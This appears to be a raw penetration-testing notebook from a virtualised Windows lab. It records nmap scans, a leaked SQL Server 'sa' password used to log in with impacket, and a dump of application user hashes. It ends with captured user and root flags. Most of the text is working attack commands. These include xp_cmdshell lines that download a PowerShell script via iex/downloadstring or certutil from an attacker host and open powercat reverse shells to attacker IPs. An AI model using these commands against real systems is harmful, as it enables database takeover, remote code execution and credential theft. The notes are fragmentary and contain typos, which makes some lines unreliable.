xp_cmdshell powershell "iex(new-object net.webclient).downloadstring(\"http://192.168.69.3:8000/mitren.ps1\");powerrcatt -c 192.168.69.3 -p 4444 -e cmd"




xp_cmdshell "dir C:\Temp"


xp_cmdshell "curl http://192.168.69.3:8000/mitren.ps1 -o C:\Temp\mitren.ps1"


certutil -urlcache -f http://192.168.69.3:8000/rev.exe rev.exe
xp_cmdshell "certutil -urlcache -f http://http://192.168.69.3:8000/mitren.ps1 C:\Temp\mitren.ps1"

xp_cmdshell powershell "powerrcatt -c 192.168.69.3 -p 4444 -e cmd"




xp_cmdshell powershell "iex(new-object net.webclient).downloadstring(\"http://192.168.18.19/mitren.ps1\");powerrcatt -c 192.168.18.19 -p 9001 -e cmd"


xp_cmdshell powershell "iex(new-object net.webclient).downloadstring(\"http://192.168.69.3/mitren.ps1\");powerrcatt -c 192.168.69.3 -p 4444 -e cmd"





---------------------------------------------------------------------------------------------------------------------------------------------------------------------------



┌──(kali㉿kali)-[~/Documents/Accounting]
└─$ nmap -sS -p- --open --min-rate 5000 -Pn -n 192.168.56.136 -oN scan.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-04 17:16 EST
Nmap scan report for 192.168.56.136
Host is up (0.00026s latency).
Not shown: 59852 closed tcp ports (reset), 5659 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1801/tcp  open  msmq
2103/tcp  open  zephyr-clt
2105/tcp  open  eklogin
2107/tcp  open  msmq-mgmt
5040/tcp  open  unknown
7680/tcp  open  pando-pub
9047/tcp  open  unknown
9079/tcp  open  unknown
9080/tcp  open  glrpc
9081/tcp  open  cisco-aqos
9083/tcp  open  emc-pp-mgmtsvc
9147/tcp  open  unknown
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49681/tcp open  unknown
49992/tcp open  unknown
MAC Address: 08:00:27:0D:06:B6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 13.21 seconds
                                                                                                                                    
┌──(kali㉿kali)-[~/Documents/Accounting]
└─$ grep '^[0-9]' scan.txt | cut -d '/' -f1 | sort -u | xargs | tr ' ' ','
135,139,1801,2103,2105,2107,445,49664,49665,49666,49667,49668,49669,49670,49681,49992,5040,7680,9047,9079,9080,9081,9083,9147
                                                                                                                                    
┌──(kali㉿kali)-[~/Documents/Accounting]
└─$ nmap -sVC -p135,139,1801,2103,2105,2107,445,49664,49665,49666,49667,49668,49669,49670,49681,49992,5040,7680,9047,9079,9080,9081,9083,9147 -vvv -n -Pn 192.168.56.136 -oN fullscan.txt
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-04 17:18 EST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:18
Completed NSE at 17:18, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:18
Completed NSE at 17:18, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:18
Completed NSE at 17:18, 0.00s elapsed
Initiating ARP Ping Scan at 17:18
Scanning 192.168.56.136 [1 port]
Completed ARP Ping Scan at 17:18, 0.09s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 17:18
Scanning 192.168.56.136 [24 ports]
Discovered open port 445/tcp on 192.168.56.136
Discovered open port 135/tcp on 192.168.56.136
Discovered open port 139/tcp on 192.168.56.136
Discovered open port 9079/tcp on 192.168.56.136
Discovered open port 49670/tcp on 192.168.56.136
Discovered open port 5040/tcp on 192.168.56.136
Discovered open port 9047/tcp on 192.168.56.136
Discovered open port 49681/tcp on 192.168.56.136
Discovered open port 7680/tcp on 192.168.56.136
Discovered open port 1801/tcp on 192.168.56.136
Discovered open port 9083/tcp on 192.168.56.136
Discovered open port 9080/tcp on 192.168.56.136
Discovered open port 49669/tcp on 192.168.56.136
Discovered open port 2107/tcp on 192.168.56.136
Discovered open port 49667/tcp on 192.168.56.136
Discovered open port 49992/tcp on 192.168.56.136
Discovered open port 49668/tcp on 192.168.56.136
Discovered open port 49664/tcp on 192.168.56.136
Discovered open port 2103/tcp on 192.168.56.136
Discovered open port 49665/tcp on 192.168.56.136
Discovered open port 9081/tcp on 192.168.56.136
Discovered open port 2105/tcp on 192.168.56.136
Discovered open port 49666/tcp on 192.168.56.136
Discovered open port 9147/tcp on 192.168.56.136
Completed SYN Stealth Scan at 17:18, 0.03s elapsed (24 total ports)
Initiating Service scan at 17:18
Scanning 24 services on 192.168.56.136
Service scan Timing: About 33.33% done; ETC: 17:20 (0:01:22 remaining)
Completed Service scan at 17:21, 156.13s elapsed (24 services on 1 host)
NSE: Script scanning 192.168.56.136.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:21
NSE Timing: About 99.85% done; ETC: 17:21 (0:00:00 remaining)
Completed NSE at 17:21, 43.82s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:21
Completed NSE at 17:21, 1.62s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:21
Completed NSE at 17:21, 0.01s elapsed
Nmap scan report for 192.168.56.136
Host is up, received arp-response (0.00033s latency).
Scanned at 2026-02-04 17:18:31 EST for 202s

PORT      STATE SERVICE       REASON          VERSION
135/tcp   open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 128 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 128
1801/tcp  open  msmq?         syn-ack ttl 128
2103/tcp  open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
2105/tcp  open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
2107/tcp  open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
5040/tcp  open  unknown       syn-ack ttl 128
7680/tcp  open  pando-pub?    syn-ack ttl 128
9047/tcp  open  unknown       syn-ack ttl 128
9079/tcp  open  unknown       syn-ack ttl 128
9080/tcp  open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9081/tcp  open  http          syn-ack ttl 128 Microsoft Cassini httpd 4.0.1.6 (ASP.NET 4.0.30319)
| http-title: Login Saci
|_Requested resource was /App/Login.aspx
|_http-server-header: Cassini/4.0.1.6
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
9083/tcp  open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9147/tcp  open  unknown       syn-ack ttl 128
49664/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49681/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49992/tcp open  ms-sql-s      syn-ack ttl 128 Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-info: 
|   192.168.56.136\COMPAC: 
|     Instance name: COMPAC
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 49992
|_    Clustered: false
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-05T01:09:27
| Not valid after:  2056-02-05T01:09:27
| MD5:   846e:47ba:ecde:f425:8884:cc5b:401f:ed26
| SHA-1: 5807:fb0b:a68e:0391:747b:6e2e:36e2:38c2:6446:eb98
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQGCOmY/x7x5RMIfTOWc9arjANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjYwMjA1MDEwOTI3WhgPMjA1NjAyMDUwMTA5MjdaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMGqn8u3
| zMbr5xSnOdxiij43O69A6oYtCyo3uJ3TDR/1Ar7dQSlns5/xRHL/Q1ef9+icXD0T
| KKXed3CbtRUXxkk+uIUjQm3RuPW4CAUkTbpj/72GHewkBsgDJ9e/hQBbnyxB6Niv
| Fn2OTjqRFeVJXWJE6oPg3FIk0C1MN+QWMI7T6o8Ytqyx7v7w0YbTbfzn/WZeWhAU
| 7VsQStIltzSDZmhiDxGNlbefRcAHIlZKRaJ69Ya2nKlg0I2+wFJXwJnvaP1OEPqu
| IagKqRqDEttOLD4KrxNuDhpleI4apxU1TFxdSBYte5eQfl1O+10lailxpRzC1sNa
| eu73UJ+O4yTHuykCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAED7yAwMYiAUMRRXI
| 3h5MkIgK6WQAN8WjPyqEbr4wYqqaf7anuh5JCEB9Mvo5t3QQZhG1NU0chHUDlZN/
| Iln/d0I3mQibqLrrINuKF5I2Mp4WMu1iRyPEeUri6cR5XzA7dL/QTH3w0mL0DD8/
| 08iu1fq2GVYWm1OtKgvreQdHRjyVNSKEmq5ziUWDdBLRSmXQ0oJbgHg2zkh6Id2x
| Xo0+4rDrBOL1HRRsO3Mte8qYWgJr4rdm6PLAztZS9Q/w93Eq+gRfxzZpImEoHlLZ
| 0XH+x9sCC3Mnru69E4YD3NTWaMiO2bJqD4jwATeZG/v6PmvKSn7YT/t225h9ZHdN
| oQ8Ntw==
|_-----END CERTIFICATE-----
|_ssl-date: 2026-02-05T01:21:51+00:00; +2h59m58s from scanner time.
| ms-sql-ntlm-info: 
|   192.168.56.136\COMPAC: 
|     Target_Name: DESKTOP-M464J3M
|     NetBIOS_Domain_Name: DESKTOP-M464J3M
|     NetBIOS_Computer_Name: DESKTOP-M464J3M
|     DNS_Domain_Name: DESKTOP-M464J3M
|     DNS_Computer_Name: DESKTOP-M464J3M
|_    Product_Version: 10.0.19041
MAC Address: 08:00:27:0D:06:B6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: DESKTOP-M464J3M, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:0d:06:b6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| Names:
|   DESKTOP-M464J3M<20>  Flags: <unique><active>
|   DESKTOP-M464J3M<00>  Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   08:00:27:0d:06:b6:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 45728/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 13378/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 59007/udp): CLEAN (Failed to receive data)
|   Check 4 (port 38386/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2026-02-05T01:21:07
|_  start_date: N/A
|_clock-skew: mean: 2h59m58s, deviation: 0s, median: 2h59m57s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:21
Completed NSE at 17:21, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:21
Completed NSE at 17:21, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:21
Completed NSE at 17:21, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 202.31 seconds
           Raw packets sent: 25 (1.084KB) | Rcvd: 25 (1.084KB)
                                                                                                                                    
┌──(kali㉿kali)-[~/Documents/Accounting]
└─$ 








http://192.168.56.136:9081/download/notas.txt




supervisor
supervisor

















─(kali㉿kali)-[~/Documents/Accounting]
└─$ cat SQL.txt 
SQL 2017 
Instancia COMPAC 
sa 
Contpaqi2023.

ip
127.0.0.1

Tip para terminar instalaciones
1) Ejecutar seguridad de icono
Sobre el icono asegurarse que diga ejecutar como Administrador.

2) Ejecutar el comando regedit...
Buscar la llave Hkey Local Machine, luego Software, luego Wow32, Computacion en Accion...(abri pantalla con boton del lado derecho
donde dice seguridad y ver que aparezca "everyone" y darle control total



                                                                                                                                     
┌──(kali㉿kali)-[~/Documents/Accounting]
└─$ impacket-mssqlclient --help
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

usage: mssqlclient.py [-h] [-db DB] [-windows-auth] [-debug] [-show] [-command [COMMAND ...]] [-file FILE] [-hashes LMHASH:NTHASH]
                      [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-target-ip ip address] [-port PORT]
                      target

TDS client implementation (SSL supported).

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>

options:
  -h, --help            show this help message and exit
  -db DB                MSSQL database instance (default None)
  -windows-auth         whether or not to use Windows Authentication (default False)
  -debug                Turn DEBUG output ON
  -show                 show the queries
  -command [COMMAND ...]
                        Commands to execute in the SQL shell. Multiple commands can be passed.
  -file FILE            input file with commands to execute in the SQL shell

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If
                        valid credentials cannot be found, it will use the ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)

connection:
  -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target
                        parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful
                        when target is the NetBIOS name and you cannot resolve it
  -port PORT            target MSSQL port (default 1433)
                                                                                                                                     
┌──(kali㉿kali)-[~/Documents/Accounting]
└─$ impacket-mssqlclient -dc-ip 192.168.56.136 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

usage: mssqlclient.py [-h] [-db DB] [-windows-auth] [-debug] [-show] [-command [COMMAND ...]] [-file FILE] [-hashes LMHASH:NTHASH]






──(kali㉿kali)-[~/Documents/Accounting]
└─$ impacket-mssqlclient  sa:'Contpaqi2023.'@192.168.56.136 -port 49992 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 


elect name from sys.databases;
name            
-------------   
master          

tempdb          

model           

msdb            

GeneralesSQL    

DB_Directory    

ADD_Catalogos   

SQL (sa  dbo@master)> select user_name();
      
---   
dbo   


                      [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-target-ip ip address] [-port PORT]
                      target
mssqlclient.py: error: the following arguments are required: target
                                                                                                                                     
┌──(kali㉿kali)-[~/Documents/Accounting]
└─$ impacket-mssqlclient -target-ip 192.168.56.136 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

usage: mssqlclient.py [-h] [-db DB] [-windows-auth] [-debug] [-show] [-command [COMMAND ...]] [-file FILE] [-hashes LMHASH:NTHASH]
                      [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-target-ip ip address] [-port PORT]
                      target
mssqlclient.py: error: the following arguments are required: target
                                                                                                                                     
┌──(kali㉿kali)-[~/Documents/Accounting]
└─$ impacket-mssqlclient -windows-auth sa:Contpaqi2023.@192.168.56.136 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 



QL (sa  dbo@DB_Directory)> select name from GeneralesSQL.sys.tables;
name                   
--------------------   
Counters               

INPCs                  

ListaEmpresas          

Perfiles               

PermisosUsuario        

PermisosPerfil         

Procesos               

Usuarios               

ModelosFinancieros     

Paises                 

Temps                  

Municipios             

Estados                

PeriodosSAT            

Notificaciones         

HistorialContrasenas   

EmpresasUsuario        

SQL (sa  dbo@DB_Directory)> use GeneralesSQL;
ENVCHANGE(DATABASE): Old Value: DB_Directory, New Value: GeneralesSQL
INFO(DESKTOP-M464J3M\COMPAC): Line 1: Changed database context to 'GeneralesSQL'.
SQL (sa  dbo@GeneralesSQL)> select * from Usuarios;
Id   RowVersion   Codigo       Nombre       FechaRegistro         EsBaja   Clave                          IdPerfil   UsaTodasEmpresas   UsuarioContPAQ   UsuarioAdminPAQ   UsuarioNomiPAQ   UsuarioCheqPAQ   TimeStamp   Guid                                   eMail   eMailClave   eMailRecuperacion   FechaUltimaActividad   FechaVencimientoClave   ClaveTemporal   ExpiraClave   
--   ----------   ----------   ----------   -------------------   ------   ----------------------------   --------   ----------------   --------------   ---------------   --------------   --------------   ---------   ------------------------------------   -----   ----------   -----------------   --------------------   ---------------------   -------------   -----------   
 1    695904783   SUPERVISOR   Supervisor   2024-05-10 00:00:00        0   2jmj7l5rSw0yVb/vlWAYkK/YBwk=          1                  1                1                 1                1                1               50B2B219-CB60-4755-B0B5-8B9BE97A1CC2                                            NULL                   NULL                                0             0   







https://github.com/rexpository/powercat-v2.0







SQL (sa  dbo@DB_Directory)> xp_cmdshell dir
output                                                                             
--------------------------------------------------------------------------------   
 El volumen de la unidad C no tiene etiqueta.                                      

 El número de serie del volumen es: A622-5802                                      

NULL                                                                               

 Directorio de C:\Windows\system32  
 
 
 
 
 └─$ python3 -m http.server -b 192.168.56.7
Serving HTTP on 192.168.56.7 port 8000 (http://192.168.56.7:8000/) ...
192.168.56.136 - - [06/Feb/2026 15:21:14] "GET /mittre.ps1 HTTP/1.1" 200 -





 
SQL (sa  dbo@master)> xp_cmdshell powershell -c "iex(iwr http://192.168.56.7:8000/mittre.ps1 -UseBasicParsing);powerrcatt -c 192.168.56.7 -p 9001 -e cmd"








C:\Users\contpaqi>cd Desktop
cd Desktop

C:\Users\contpaqi\Desktop>dir
dir
 El volumen de la unidad C no tiene etiqueta.
 El n�mero de serie del volumen es: A622-5802

 Directorio de C:\Users\contpaqi\Desktop

05/10/2024  07:12 PM    <DIR>          .
05/10/2024  07:12 PM    <DIR>          ..
05/10/2024  06:58 PM                35 user.txt
               1 archivos             35 bytes
               2 dirs   3,486,240,768 bytes libres

C:\Users\contpaqi\Desktop>type user.txt
type user.txt
bf79ead1586ea0cd464dd58257be9e30  

bf79ead1586ea0cd464dd58257be9e30

C:\Users\contpaqi\Desktop>











cd Desktop
PS C:\Users\admin\Desktop> ls
ls


    Directorio: C:\Users\admin\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         5/10/2024   8:05 PM           1192 root.txt                






PS C:\Users\admin\Desktop> cmd
cmd
Microsoft Windows [Versi�n 10.0.19045.2965]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Users\admin\Desktop>dir /r
dir /r
 El volumen de la unidad C no tiene etiqueta.
 El n�mero de serie del volumen es: A622-5802

 Directorio de C:\Users\admin\Desktop

05/10/2024  07:12 PM    <DIR>          .
05/10/2024  07:12 PM    <DIR>          ..
05/10/2024  07:05 PM             1,192 root.txt
                                    35 root.txt:HI:$DATA
               1 archivos          1,192 bytes
               2 dirs   3,486,097,408 bytes libres

C:\Users\admin\Desktop>root.txt:HI:$DATA
root.txt:HI:$DATA

El nombre de archivo, el nombre de directorio o la sintaxis de la etiqueta del volumen no son correctos.C:\Users\admin\Desktop>more < root.txt:HI
more < root.txt:HI
1b76510c01f7dbe2e420adefaf02a34b 

C:\Users\admin\Desktop>
                                             


PS C:\Users\admin\Desktop> type root.txt
type root.txt
                      ____...                                  
             .-"--"""".__    `.                                
            |            `    |                                
  (         `._....------.._.:          
   )         .()''        ``().                                
  '          () .=='  `===  `-.         
   . )       (         g)                                
    )         )     /        J          
   (          |.   /      . (                                  
   $$         (.  (_'.   , )|`                                 
   ||         |\`-....--'/  ' \                                
  /||.         \\ | | | /  /   \.                              
 //||(\         \`-===-'  '     \o.                            
.//7' |)         `. --   / (     OObaaaad888b.                 
(<<. / |     .a888b`.__.'d\     OO888888888888a.               
 \  Y' |    .8888888aaaa88POOOOOO888888888888888.              
  \  \ |   .888888888888888888888888888888888888b              
   |   |  .d88888P88888888888888888888888b8888888.             
   b.--d .d88888P8888888888888888a:f888888|888888b             
   88888b 888888|8888888888888888888888888\8888888
PS C:\Users\admin\Desktop> 


